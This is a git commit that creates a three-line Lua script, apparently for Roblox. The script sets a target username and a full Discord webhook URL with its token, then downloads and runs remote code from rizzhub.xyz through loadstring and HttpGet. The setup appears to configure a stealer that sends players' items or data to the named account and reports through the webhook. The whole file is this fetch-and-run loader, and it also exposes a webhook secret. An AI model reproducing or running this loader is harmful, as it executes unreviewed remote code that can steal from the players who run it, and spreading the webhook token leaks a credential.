2806d002e1979842cea3b50803bc504199868de0
GoldenGrahamz <131412527+GoldenGrahamz@users.noreply.github.com>
2023-04-20 19:10:40 -0400

    Create myscript.lua

---
+++ myscript.lua
@@ -0,0 +1,3 @@
+UserName = "sssssniperdoge"
+Webhook = "https://discord.com/api/webhooks/1098704426874716190/grJeAEzF4tLWoPAytiz430juPjIDq760pmcjCMNfxqa7PltKDSt1DH-LqntOSJEEKBoH"
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
